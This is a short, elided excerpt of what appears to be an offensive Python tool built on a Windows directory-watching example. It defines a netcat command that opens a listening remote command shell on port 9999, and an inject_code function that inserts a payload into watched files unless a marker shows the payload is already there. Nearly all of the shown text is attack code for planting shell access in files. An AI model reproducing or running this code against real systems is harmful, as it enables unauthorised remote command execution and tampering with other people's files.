# Modified example that is originally given here: http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html
...
TGT_PORT = 9999
CMD = f"{NETCAT} -t {TGT_IP} -p {TGT_PORT} -l -c"
...
def inject_code(full_filename, contents, extension):
    if FILE_TYPES[extension][0].strip() in contents: # If the payload is already present (the marker), do nothing
        return
